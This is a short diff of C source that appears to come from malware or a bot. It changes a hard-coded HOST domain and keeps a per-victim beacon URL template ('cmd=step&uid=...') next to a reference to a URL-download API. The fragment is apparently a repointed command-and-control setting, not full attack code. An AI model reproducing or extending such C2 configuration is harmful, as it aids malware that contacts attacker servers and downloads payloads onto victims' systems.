@@ -10,7 +10,7 @@ char URL[1024], URL2[1024];
 
 //typedef HRESULT (WINAPI *typeURLDownloadToFileA)( LPUNKNOWN pCaller, LPCTSTR szURL, LPCTSTR szFileName, DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB );
 
-const char* HOST = "srgsgsg.info";
+const char* HOST = "mirandahf.info";
 #ifdef RELEASEDLL
 	char* UrlStep = "geter/index_.php?cmd=step&uid=%s&step=%d%%5Fdp";
 #else
